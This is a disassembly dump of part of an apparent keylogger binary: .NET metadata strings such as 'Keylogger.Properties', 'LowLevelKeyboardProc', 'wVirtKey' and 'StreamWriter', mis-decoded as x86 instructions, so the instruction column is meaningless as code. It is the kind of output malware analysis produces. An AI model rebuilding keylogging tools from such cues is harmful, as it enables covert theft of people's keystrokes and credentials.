  402b43:	64 65 00 6c 70 4b    	fs add %ch,%gs:0x4b(%eax,%esi,2)
  402b49:	65 79 53             	gs jns 0x402b9f
  402b4c:	74 61                	je     0x402baf
  402b4e:	74 65                	je     0x402bb5
  402b50:	00 69 64             	add    %ch,0x64(%ecx)
  402b53:	54                   	push   %esp
  402b54:	68 72 65 61 64       	push   $0x64616572
  402b59:	00 77 56             	add    %dh,0x56(%edi)
  402b5c:	69 72 74 4b 65 79 00 	imul   $0x79654b,0x74(%edx),%esi
  402b63:	77 53                	ja     0x402bb8
  402b65:	63 61 6e             	arpl   %esp,0x6e(%ecx)
  402b68:	43                   	inc    %ebx
  402b69:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6a:	64 65 00 70 77       	fs add %dh,%gs:0x77(%eax)
  402b6f:	73 7a                	jae    0x402beb
  402b71:	42                   	inc    %edx
  402b72:	75 66                	jne    0x402bda
  402b74:	66 00 63 63          	data16 add %ah,0x63(%ebx)
  402b78:	68 42 75 66 66       	push   $0x66667542
  402b7d:	00 77 46             	add    %dh,0x46(%edi)
  402b80:	6c                   	insb   (%dx),%es:(%edi)
  402b81:	61                   	popa
  402b82:	67 73 00             	addr16 jae 0x402b85
  402b85:	64 77 68             	fs ja  0x402bf0
  402b88:	6b 6c 00 75 43       	imul   $0x43,0x75(%eax,%eax,1),%ebp
  402b8d:	6f                   	outsl  %ds:(%esi),(%dx)
  402b8e:	64 65 00 75 4d       	fs add %dh,%gs:0x4d(%ebp)
  402b93:	61                   	popa
  402b94:	70 54                	jo     0x402bea
  402b96:	79 70                	jns    0x402c08
  402b98:	65 00 76 61          	add    %dh,%gs:0x61(%esi)
  402b9c:	6c                   	insb   (%dx),%es:(%edi)
  402b9d:	75 65                	jne    0x402c04
  402b9f:	00 73 00             	add    %dh,0x0(%ebx)
  402ba2:	6f                   	outsl  %ds:(%esi),(%dx)
  402ba3:	62 6a 65             	bound  %ebp,0x65(%edx)
  402ba6:	63 74 00 6d          	arpl   %esi,0x6d(%eax,%eax,1)
  402baa:	65 74 68             	gs je  0x402c15
  402bad:	6f                   	outsl  %ds:(%esi),(%dx)
  402bae:	64 00 63 61          	add    %ah,%fs:0x61(%ebx)
  402bb2:	6c                   	insb   (%dx),%es:(%edi)
  402bb3:	6c                   	insb   (%dx),%es:(%edi)
  402bb4:	62 61 63             	bound  %esp,0x63(%ecx)
  402bb7:	6b 00 72             	imul   $0x72,(%eax),%eax
  402bba:	65 73 75             	gs jae 0x402c32
  402bbd:	6c                   	insb   (%dx),%es:(%edi)
  402bbe:	74 00                	je     0x402bc0
  402bc0:	52                   	push   %edx
  402bc1:	65 73 6f             	gs jae 0x402c33
  402bc4:	75 72                	jne    0x402c38
  402bc6:	63 65 4d             	arpl   %esp,0x4d(%ebp)
  402bc9:	61                   	popa
  402bca:	6e                   	outsb  %ds:(%esi),(%dx)
  402bcb:	61                   	popa
  402bcc:	67 65 72 00          	addr16 gs jb 0x402bd0
  402bd0:	43                   	inc    %ebx
  402bd1:	75 6c                	jne    0x402c3f
  402bd3:	74 75                	je     0x402c4a
  402bd5:	72 65                	jb     0x402c3c
  402bd7:	00 44 65 66          	add    %al,0x66(%ebp,%eiz,2)
  402bdb:	61                   	popa
  402bdc:	75 6c                	jne    0x402c4a
  402bde:	74 00                	je     0x402be0
  402be0:	3c 4d                	cmp    $0x4d,%al
  402be2:	6f                   	outsl  %ds:(%esi),(%dx)
  402be3:	64 75 6c             	fs jne 0x402c52
  402be6:	65 3e 00 50 72       	gs add %dl,%ds:0x72(%eax)
  402beb:	6f                   	outsl  %ds:(%esi),(%dx)
  402bec:	67 72 61             	addr16 jb 0x402c50
  402bef:	6d                   	insl   (%dx),%es:(%edi)
  402bf0:	00 52 65             	add    %dl,0x65(%edx)
  402bf3:	73 6f                	jae    0x402c64
  402bf5:	75 72                	jne    0x402c69
  402bf7:	63 65 73             	arpl   %esp,0x73(%ebp)
  402bfa:	00 4b 65             	add    %cl,0x65(%ebx)
  402bfd:	79 6c                	jns    0x402c6b
  402bff:	6f                   	outsl  %ds:(%esi),(%dx)
  402c00:	67 67 65 72 2e       	addr16 addr16 gs jb 0x402c33
  402c05:	50                   	push   %eax
  402c06:	72 6f                	jb     0x402c77
  402c08:	70 65                	jo     0x402c6f
  402c0a:	72 74                	jb     0x402c80
  402c0c:	69 65 73 00 53 65 74 	imul   $0x74655300,0x73(%ebp),%esp
  402c13:	74 69                	je     0x402c7e
  402c15:	6e                   	outsb  %ds:(%esi),(%dx)
  402c16:	67 73 00             	addr16 jae 0x402c19
  402c19:	3c 50                	cmp    $0x50,%al
  402c1b:	72 69                	jb     0x402c86
  402c1d:	76 61                	jbe    0x402c80
  402c1f:	74 65                	je     0x402c86
  402c21:	49                   	dec    %ecx
  402c22:	6d                   	insl   (%dx),%es:(%edi)
  402c23:	70 6c                	jo     0x402c91
  402c25:	65 6d                	gs insl (%dx),%es:(%edi)
  402c27:	65 6e                	outsb  %gs:(%esi),(%dx)
  402c29:	74 61                	je     0x402c8c
  402c2b:	74 69                	je     0x402c96
  402c2d:	6f                   	outsl  %ds:(%esi),(%dx)
  402c2e:	6e                   	outsb  %ds:(%esi),(%dx)
  402c2f:	44                   	inc    %esp
  402c30:	65 74 61             	gs je  0x402c94
  402c33:	69 6c 73 3e 00 4c 6f 	imul   $0x776f4c00,0x3e(%ebx,%esi,2),%ebp
  402c3a:	77 
  402c3b:	4c                   	dec    %esp
  402c3c:	65 76 65             	gs jbe 0x402ca4
  402c3f:	6c                   	insb   (%dx),%es:(%edi)
  402c40:	4b                   	dec    %ebx
  402c41:	65 79 62             	gs jns 0x402ca6
  402c44:	6f                   	outsl  %ds:(%esi),(%dx)
  402c45:	61                   	popa
  402c46:	72 64                	jb     0x402cac
  402c48:	50                   	push   %eax
  402c49:	72 6f                	jb     0x402cba
  402c4b:	63 00                	arpl   %eax,(%eax)
  402c4d:	41                   	inc    %ecx
  402c4e:	70 70                	jo     0x402cc0
  402c50:	6c                   	insb   (%dx),%es:(%edi)
  402c51:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  402c58:	00 53 79             	add    %dl,0x79(%ebx)
  402c5b:	73 74                	jae    0x402cd1
  402c5d:	65 6d                	gs insl (%dx),%es:(%edi)
  402c5f:	2e 57                	cs push %edi
  402c61:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  402c68:	46                   	inc    %esi
  402c69:	6f                   	outsl  %ds:(%esi),(%dx)
  402c6a:	72 6d                	jb     0x402cd9
  402c6c:	73 00                	jae    0x402c6e
  402c6e:	4f                   	dec    %edi
  402c6f:	62 6a 65             	bound  %ebp,0x65(%edx)
  402c72:	63 74 00 53          	arpl   %esi,0x53(%eax,%eax,1)
  402c76:	79 73                	jns    0x402ceb
  402c78:	74 65                	je     0x402cdf
  402c7a:	6d                   	insl   (%dx),%es:(%edi)
  402c7b:	00 50 72             	add    %dl,0x72(%eax)
  402c7e:	6f                   	outsl  %ds:(%esi),(%dx)
  402c7f:	63 65 73             	arpl   %esp,0x73(%ebp)
  402c82:	73 00                	jae    0x402c84
  402c84:	53                   	push   %ebx
  402c85:	79 73                	jns    0x402cfa
  402c87:	74 65                	je     0x402cee
  402c89:	6d                   	insl   (%dx),%es:(%edi)
  402c8a:	2e 44                	cs inc %esp
  402c8c:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  402c93:	69 63 73 00 49 44 69 	imul   $0x69444900,0x73(%ebx),%esp
  402c9a:	73 70                	jae    0x402d0c
  402c9c:	6f                   	outsl  %ds:(%esi),(%dx)
  402c9d:	73 61                	jae    0x402d00
  402c9f:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  402ca3:	4d                   	dec    %ebp
  402ca4:	61                   	popa
  402ca5:	72 73                	jb     0x402d1a
  402ca7:	68 61 6c 00 53       	push   $0x53006c61
  402cac:	79 73                	jns    0x402d21
  402cae:	74 65                	je     0x402d15
  402cb0:	6d                   	insl   (%dx),%es:(%edi)
  402cb1:	2e 52                	cs push %edx
  402cb3:	75 6e                	jne    0x402d23
  402cb5:	74 69                	je     0x402d20
  402cb7:	6d                   	insl   (%dx),%es:(%edi)
  402cb8:	65 2e 49             	gs cs dec %ecx
  402cbb:	6e                   	outsb  %ds:(%esi),(%dx)
  402cbc:	74 65                	je     0x402d23
  402cbe:	72 6f                	jb     0x402d2f
  402cc0:	70 53                	jo     0x402d15
  402cc2:	65 72 76             	gs jb  0x402d3b
  402cc5:	69 63 65 73 00 4b 65 	imul   $0x654b0073,0x65(%ebx),%esp
  402ccc:	79 73                	jns    0x402d41
  402cce:	00 53 74             	add    %dl,0x74(%ebx)
  402cd1:	72 65                	jb     0x402d38
  402cd3:	61                   	popa
  402cd4:	6d                   	insl   (%dx),%es:(%edi)
  402cd5:	57                   	push   %edi
  402cd6:	72 69                	jb     0x402d41
  402cd8:	74 65                	je     0x402d3f
  402cda:	72 00                	jb     0x402cdc
  402cdc:	53                   	push   %ebx
  402cdd:	79 73                	jns    0x402d52
  402cdf:	74 65                	je     0x402d46
  402ce1:	6d                   	insl   (%dx),%es:(%edi)
  402ce2:	2e 49                	cs dec %ecx
  402ce4:	4f                   	dec    %edi
  402ce5:	00 54 65 78          	add    %dl,0x78(%ebp,%eiz,2)
  402ce9:	74 57                	je     0x402d42
  402ceb:	72 69                	jb     0x402d56
  402ced:	74 65                	je     0x402d54
  402cef:	72 00                	jb     0x402cf1
  402cf1:	45                   	inc    %ebp
  402cf2:	6e                   	outsb  %ds:(%esi),(%dx)
  402cf3:	76 69                	jbe    0x402d5e
  402cf5:	72 6f                	jb     0x402d66
  402cf7:	6e                   	outsb  %ds:(%esi),(%dx)
  402cf8:	6d                   	insl   (%dx),%es:(%edi)
  402cf9:	65 6e                	outsb  %gs:(%esi),(%dx)
  402cfb:	74 00                	je     0x402cfd
  402cfd:	53                   	push   %ebx
  402cfe:	74 72                	je     0x402d72
  402d00:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  402d07:	64 65 72 00          	fs gs jb 0x402d0b
  402d0b:	53                   	push   %ebx
  402d0c:	79 73                	jns    0x402d81
  402d0e:	74 65                	je     0x402d75
  402d10:	6d                   	insl   (%dx),%es:(%edi)
  402d11:	2e 54                	cs push %esp
  402d13:	65 78 74             	gs js  0x402d8a
  402d16:	00 42 79             	add    %al,0x79(%edx)
  402d19:	74 65                	je     0x402d80
  402d1b:	00 45 78             	add    %al,0x78(%ebp)
  402d1e:	63 65 70             	arpl   %esp,0x70(%ebp)
  402d21:	74 69                	je     0x402d8c
  402d23:	6f                   	outsl  %ds:(%esi),(%dx)
  402d24:	6e                   	outsb  %ds:(%esi),(%dx)
  402d25:	00 53 79             	add    %dl,0x79(%ebx)
  402d28:	73 74                	jae    0x402d9e
  402d2a:	65 6d                	gs insl (%dx),%es:(%edi)
  402d2c:	2e 52                	cs push %edx
  402d2e:	65 73 6f             	gs jae 0x402da0
  402d31:	75 72                	jne    0x402da5
  402d33:	63 65 73             	arpl   %esp,0x73(%ebp)
  402d36:	00 43 75             	add    %al,0x75(%ebx)
  402d39:	6c                   	insb   (%dx),%es:(%edi)
  402d3a:	74 75                	je     0x402db1
  402d3c:	72 65                	jb     0x402da3
  402d3e:	49                   	dec    %ecx
  402d3f:	6e                   	outsb  %ds:(%esi),(%dx)
  402d40:	66 6f                	outsw  %ds:(%esi),(%dx)
  402d42:	00 53 79             	add    %dl,0x79(%ebx)
  402d45:	73 74                	jae    0x402dbb
  402d47:	65 6d                	gs insl (%dx),%es:(%edi)
  402d49:	2e 47                	cs inc %edi
  402d4b:	6c                   	insb   (%dx),%es:(%edi)
  402d4c:	6f                   	outsl  %ds:(%esi),(%dx)
  402d4d:	62 61 6c             	bound  %esp,0x6c(%ecx)
  402d50:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  402d57:	00 54 79 70          	add    %dl,0x70(%ecx,%edi,2)
  402d5b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402d5f:	73 65                	jae    0x402dc6
  402d61:	6d                   	insl   (%dx),%es:(%edi)
  402d62:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  402d66:	53                   	push   %ebx
  402d67:	79 73                	jns    0x402ddc
  402d69:	74 65                	je     0x402dd0
  402d6b:	6d                   	insl   (%dx),%es:(%edi)
  402d6c:	2e 52                	cs push %edx
  402d6e:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  402d71:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  402d76:	6e                   	outsb  %ds:(%esi),(%dx)
  402d77:	00 41 70             	add    %al,0x70(%ecx)
  402d7a:	70 6c                	jo     0x402de8
  402d7c:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  402d83:	53                   	push   %ebx
  402d84:	65 74 74             	gs je  0x402dfb
  402d87:	69 6e 67 73 42 61 73 	imul   $0x73614273,0x67(%esi),%ebp
  402d8e:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  402d92:	73 74                	jae    0x402e08
  402d94:	65 6d                	gs insl (%dx),%es:(%edi)
  402d96:	2e 43                	cs inc %ebx
  402d98:	6f                   	outsl  %ds:(%esi),(%dx)
  402d99:	6e                   	outsb  %ds:(%esi),(%dx)
  402d9a:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402da0:	74 69                	je     0x402e0b
  402da2:	6f                   	outsl  %ds:(%esi),(%dx)
  402da3:	6e                   	outsb  %ds:(%esi),(%dx)
  402da4:	00 53 65             	add    %dl,0x65(%ebx)
  402da7:	74 74                	je     0x402e1d
  402da9:	69 6e 67 73 42 61 73 	imul   $0x73614273,0x67(%esi),%ebp
  402db0:	65 00 4d 75          	add    %cl,%gs:0x75(%ebp)
  402db4:	6c                   	insb   (%dx),%es:(%edi)
  402db5:	74 69                	je     0x402e20
  402db7:	63 61 73             	arpl   %esp,0x73(%ecx)
  402dba:	74 44                	je     0x402e00
  402dbc:	65 6c                	gs insb (%dx),%es:(%edi)
  402dbe:	65 67 61             	gs addr16 popa
  402dc1:	74 65                	je     0x402e28
  402dc3:	00 41 73             	add    %al,0x73(%ecx)
  402dc6:	79 6e                	jns    0x402e36
  402dc8:	63 43 61             	arpl   %eax,0x61(%ebx)
  402dcb:	6c                   	insb   (%dx),%es:(%edi)
  402dcc:	6c                   	insb   (%dx),%es:(%edi)
  402dcd:	62 61 63             	bound  %esp,0x63(%ecx)
  402dd0:	6b 00 49             	imul   $0x49,(%eax),%eax
  402dd3:	41                   	inc    %ecx
  402dd4:	73 79                	jae    0x402e4f
  402dd6:	6e                   	outsb  %ds:(%esi),(%dx)
  402dd7:	63 52 65             	arpl   %edx,0x65(%edx)
  402dda:	73 75                	jae    0x402e51
  402ddc:	6c                   	insb   (%dx),%es:(%edi)
  402ddd:	74 00                	je     0x402ddf
  402ddf:	45                   	inc    %ebp
  402de0:	64 69 74 6f 72 42 72 	imul   $0x776f7242,%fs:0x72(%edi,%ebp,2),%esi
  402de7:	6f 77 
  402de9:	73 61                	jae    0x402e4c
  402deb:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402def:	74 74                	je     0x402e65
  402df1:	72 69                	jb     0x402e5c
  402df3:	62 75 74             	bound  %esi,0x74(%ebp)
  402df6:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  402dfa:	73 74                	jae    0x402e70
  402dfc:	65 6d                	gs insl (%dx),%es:(%edi)
  402dfe:	2e 43                	cs inc %ebx
  402e00:	6f                   	outsl  %ds:(%esi),(%dx)
  402e01:	6d                   	insl   (%dx),%es:(%edi)
  402e02:	70 6f                	jo     0x402e73
  402e04:	6e                   	outsb  %ds:(%esi),(%dx)
  402e05:	65 6e                	outsb  %gs:(%esi),(%dx)
  402e07:	74 4d                	je     0x402e56
  402e09:	6f                   	outsl  %ds:(%esi),(%dx)
  402e0a:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  402e0d:	00 43 6f             	add    %al,0x6f(%ebx)
  402e10:	6d                   	insl   (%dx),%es:(%edi)
  402e11:	70 69                	jo     0x402e7c
  402e13:	6c                   	insb   (%dx),%es:(%edi)
  402e14:	61                   	popa
  402e15:	74 69                	je     0x402e80
  402e17:	6f                   	outsl  %ds:(%esi),(%dx)
  402e18:	6e                   	outsb  %ds:(%esi),(%dx)
  402e19:	52                   	push   %edx
  402e1a:	65 6c                	gs insb (%dx),%es:(%edi)
  402e1c:	61                   	popa
  402e1d:	78 61                	js     0x402e80
  402e1f:	74 69                	je     0x402e8a
  402e21:	6f                   	outsl  %ds:(%esi),(%dx)
  402e22:	6e                   	outsb  %ds:(%esi),(%dx)
  402e23:	73 41                	jae    0x402e66
  402e25:	74 74                	je     0x402e9b
  402e27:	72 69                	jb     0x402e92
  402e29:	62 75 74             	bound  %esi,0x74(%ebp)
  402e2c:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  402e30:	73 74                	jae    0x402ea6
  402e32:	65 6d                	gs insl (%dx),%es:(%edi)
  402e34:	2e 52                	cs push %edx
  402e36:	75 6e                	jne    0x402ea6
  402e38:	74 69                	je     0x402ea3
  402e3a:	6d                   	insl   (%dx),%es:(%edi)
  402e3b:	65 2e 43             	gs cs inc %ebx
  402e3e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e3f:	6d                   	insl   (%dx),%es:(%edi)
  402e40:	70 69                	jo     0x402eab
  402e42:	6c                   	insb   (%dx),%es:(%edi)
  402e43:	65 72 53             	gs jb  0x402e99
  402e46:	65 72 76             	gs jb  0x402ebf
  402e49:	69 63 65 73 00 52 75 	imul   $0x75520073,0x65(%ebx),%esp
  402e50:	6e                   	outsb  %ds:(%esi),(%dx)
  402e51:	74 69                	je     0x402ebc
  402e53:	6d                   	insl   (%dx),%es:(%edi)
  402e54:	65 43                	gs inc %ebx
  402e56:	6f                   	outsl  %ds:(%esi),(%dx)
  402e57:	6d                   	insl   (%dx),%es:(%edi)
  402e58:	70 61                	jo     0x402ebb
  402e5a:	74 69                	je     0x402ec5
  402e5c:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402e5f:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402e66:	69 
  402e67:	62 75 74             	bound  %esi,0x74(%ebp)
  402e6a:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  402e6f:	75 67                	jne    0x402ed8
  402e71:	67 61                	addr16 popa
  402e73:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  402e77:	74 74                	je     0x402eed
  402e79:	72 69                	jb     0x402ee4
  402e7b:	62 75 74             	bound  %esi,0x74(%ebp)
  402e7e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402e82:	73 65                	jae    0x402ee9
  402e84:	6d                   	insl   (%dx),%es:(%edi)
  402e85:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402e89:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  402e90:	72 
  402e91:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  402e98:	73 73                	jae    0x402f0d
  402e9a:	65 6d                	gs insl (%dx),%es:(%edi)
  402e9c:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  402ea0:	65 73 63             	gs jae 0x402f06
  402ea3:	72 69                	jb     0x402f0e
  402ea5:	70 74                	jo     0x402f1b
  402ea7:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  402eae:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  402eb5:	73 73                	jae    0x402f2a
  402eb7:	65 6d                	gs insl (%dx),%es:(%edi)
  402eb9:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402ebd:	6f                   	outsl  %ds:(%esi),(%dx)
  402ebe:	6e                   	outsb  %ds:(%esi),(%dx)
  402ebf:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  402ec5:	74 69                	je     0x402f30
  402ec7:	6f                   	outsl  %ds:(%esi),(%dx)
  402ec8:	6e                   	outsb  %ds:(%esi),(%dx)
  402ec9:	41                   	inc    %ecx
  402eca:	74 74                	je     0x402f40
  402ecc:	72 69                	jb     0x402f37
  402ece:	62 75 74             	bound  %esi,0x74(%ebp)
  402ed1:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402ed5:	73 65                	jae    0x402f3c
  402ed7:	6d                   	insl   (%dx),%es:(%edi)
  402ed8:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402edc:	6f                   	outsl  %ds:(%esi),(%dx)
  402edd:	6d                   	insl   (%dx),%es:(%edi)
  402ede:	70 61                	jo     0x402f41
  402ee0:	6e                   	outsb  %ds:(%esi),(%dx)
  402ee1:	79 41                	jns    0x402f24
  402ee3:	74 74                	je     0x402f59
  402ee5:	72 69                	jb     0x402f50
  402ee7:	62 75 74             	bound  %esi,0x74(%ebp)
  402eea:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402eee:	73 65                	jae    0x402f55
  402ef0:	6d                   	insl   (%dx),%es:(%edi)
  402ef1:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  402ef5:	72 6f                	jb     0x402f66
  402ef7:	64 75 63             	fs jne 0x402f5d
  402efa:	74 41                	je     0x402f3d
  402efc:	74 74                	je     0x402f72
  402efe:	72 69                	jb     0x402f69
  402f00:	62 75 74             	bound  %esi,0x74(%ebp)
  402f03:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402f07:	73 65                	jae    0x402f6e
  402f09:	6d                   	insl   (%dx),%es:(%edi)
  402f0a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  402f0e:	6f                   	outsl  %ds:(%esi),(%dx)
  402f0f:	70 79                	jo     0x402f8a
  402f11:	72 69                	jb     0x402f7c
  402f13:	67 68 74 41 74 74    	addr16 push $0x74744174
  402f19:	72 69                	jb     0x402f84
  402f1b:	62 75 74             	bound  %esi,0x74(%ebp)
  402f1e:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402f22:	73 65                	jae    0x402f89
  402f24:	6d                   	insl   (%dx),%es:(%edi)
  402f25:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  402f29:	72 61                	jb     0x402f8c
  402f2b:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  402f2e:	61                   	popa
  402f2f:	72 6b                	jb     0x402f9c
  402f31:	41                   	inc    %ecx
  402f32:	74 74                	je     0x402fa8
  402f34:	72 69                	jb     0x402f9f
  402f36:	62 75 74             	bound  %esi,0x74(%ebp)
  402f39:	65 00 47 75          	add    %al,%gs:0x75(%edi)
  402f3d:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
  402f44:	62 
  402f45:	75 74                	jne    0x402fbb
  402f47:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  402f4b:	73 65                	jae    0x402fb2
  402f4d:	6d                   	insl   (%dx),%es:(%edi)
  402f4e:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  402f52:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  402f59:	69 
  402f5a:	6f                   	outsl  %ds:(%esi),(%dx)
  402f5b:	6e                   	outsb  %ds:(%esi),(%dx)
  402f5c:	41                   	inc    %ecx
  402f5d:	74 74                	je     0x402fd3
  402f5f:	72 69                	jb     0x402fca
  402f61:	62 75 74             	bound  %esi,0x74(%ebp)
  402f64:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  402f69:	67 65 74 46          	addr16 gs je 0x402fb3
  402f6d:	72 61                	jb     0x402fd0
  402f6f:	6d                   	insl   (%dx),%es:(%edi)
  402f70:	65 77 6f             	gs ja  0x402fe2
  402f73:	72 6b                	jb     0x402fe0
  402f75:	41                   	inc    %ecx
  402f76:	74 74                	je     0x402fec
  402f78:	72 69                	jb     0x402fe3
  402f7a:	62 75 74             	bound  %esi,0x74(%ebp)
  402f7d:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  402f81:	73 74                	jae    0x402ff7
  402f83:	65 6d                	gs insl (%dx),%es:(%edi)
  402f85:	2e 52                	cs push %edx
  402f87:	75 6e                	jne    0x402ff7
  402f89:	74 69                	je     0x402ff4
  402f8b:	6d                   	insl   (%dx),%es:(%edi)
  402f8c:	65 2e 56             	gs cs push %esi
  402f8f:	65 72 73             	gs jb  0x403005
  402f92:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  402f99:	43                   	inc    %ebx
  402f9a:	6f                   	outsl  %ds:(%esi),(%dx)
  402f9b:	6d                   	insl   (%dx),%es:(%edi)
  402f9c:	56                   	push   %esi
  402f9d:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  402fa4:	74 74                	je     0x40301a
  402fa6:	72 69                	jb     0x403011
  402fa8:	62 75 74             	bound  %esi,0x74(%ebp)
  402fab:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  402faf:	6e                   	outsb  %ds:(%esi),(%dx)
  402fb0:	65 72 61             	gs jb  0x403014
  402fb3:	74 65                	je     0x40301a
  402fb5:	64 43                	fs inc %ebx
  402fb7:	6f                   	outsl  %ds:(%esi),(%dx)
  402fb8:	64 65 41             	fs gs inc %ecx
  402fbb:	74 74                	je     0x403031
  402fbd:	72 69                	jb     0x403028
  402fbf:	62 75 74             	bound  %esi,0x74(%ebp)
  402fc2:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  402fc6:	73 74                	jae    0x40303c
  402fc8:	65 6d                	gs insl (%dx),%es:(%edi)
  402fca:	2e 43                	cs inc %ebx
  402fcc:	6f                   	outsl  %ds:(%esi),(%dx)
  402fcd:	64 65 44             	fs gs inc %esp
  402fd0:	6f                   	outsl  %ds:(%esi),(%dx)
  402fd1:	6d                   	insl   (%dx),%es:(%edi)
  402fd2:	2e 43                	cs inc %ebx
  402fd4:	6f                   	outsl  %ds:(%esi),(%dx)
  402fd5:	6d                   	insl   (%dx),%es:(%edi)
  402fd6:	70 69                	jo     0x403041
  402fd8:	6c                   	insb   (%dx),%es:(%edi)
  402fd9:	65 72 00             	gs jb  0x402fdc
  402fdc:	44                   	inc    %esp
  402fdd:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  402fe1:	67 65 72 4e          	addr16 gs jb 0x403033
  402fe5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fe6:	6e                   	outsb  %ds:(%esi),(%dx)
  402fe7:	55                   	push   %ebp
  402fe8:	73 65                	jae    0x40304f
  402fea:	72 43                	jb     0x40302f
  402fec:	6f                   	outsl  %ds:(%esi),(%dx)
  402fed:	64 65 41             	fs gs inc %ecx
  402ff0:	74 74                	je     0x403066
  402ff2:	72 69                	jb     0x40305d
  402ff4:	62 75 74             	bound  %esi,0x74(%ebp)
  402ff7:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  402ffb:	6d                   	insl   (%dx),%es:(%edi)
  402ffc:	70 69                	jo     0x403067
  402ffe:	6c                   	insb   (%dx),%es:(%edi)
  402fff:	65 72 47             	gs jb  0x403049
  403002:	65 6e                	outsb  %gs:(%esi),(%dx)
  403004:	65 72 61             	gs jb  0x403068
  403007:	74 65                	je     0x40306e
  403009:	64 41                	fs inc %ecx
  40300b:	74 74                	je     0x403081
  40300d:	72 69                	jb     0x403078
  40300f:	62 75 74             	bound  %esi,0x74(%ebp)
  403012:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  403016:	74 50                	je     0x403068
  403018:	74 72                	je     0x40308c
  40301a:	00 53 74             	add    %dl,0x74(%ebx)
  40301d:	72 69                	jb     0x403088
  40301f:	6e                   	outsb  %ds:(%esi),(%dx)
  403020:	67 00 53 70          	add    %dl,0x70(%bp,%di)
  403024:	65 63 69 61          	arpl   %ebp,%gs:0x61(%ecx)
  403028:	6c                   	insb   (%dx),%es:(%edi)
  403029:	46                   	inc    %esi
  40302a:	6f                   	outsl  %ds:(%esi),(%dx)
  40302b:	6c                   	insb   (%dx),%es:(%edi)
  40302c:	64 65 72 00          	fs gs jb 0x403030
  403030:	52                   	push   %edx
  403031:	75 6e                	jne    0x4030a1
  403033:	74 69                	je     0x40309e
  403035:	6d                   	insl   (%dx),%es:(%edi)
  403036:	65 54                	gs push %esp
  403038:	79 70                	jns    0x4030aa
  40303a:	65 48                	gs dec %eax
  40303c:	61                   	popa
  40303d:	6e                   	outsb  %ds:(%esi),(%dx)
  40303e:	64 6c                	fs insb (%dx),%es:(%edi)
  403040:	65 00 45 64          	add    %al,%gs:0x64(%ebp)
  403044:	69 74 6f 72 42 72 6f 	imul   $0x776f7242,0x72(%edi,%ebp,2),%esi
  40304b:	77 
  40304c:	73 61                	jae    0x4030af
  40304e:	62 6c 65 53          	bound  %ebp,0x53(%ebp,%eiz,2)
  403052:	74 61                	je     0x4030b5
  403054:	74 65                	je     0x4030bb
  403056:	00 44 65 62          	add    %al,0x62(%ebp,%eiz,2)
  40305a:	75 67                	jne    0x4030c3
  40305c:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  403063:	65 
  403064:	73 00                	jae    0x403066
  403066:	6d                   	insl   (%dx),%es:(%edi)
  403067:	73 63                	jae    0x4030cc
  403069:	6f                   	outsl  %ds:(%esi),(%dx)
  40306a:	72 6c                	jb     0x4030d8
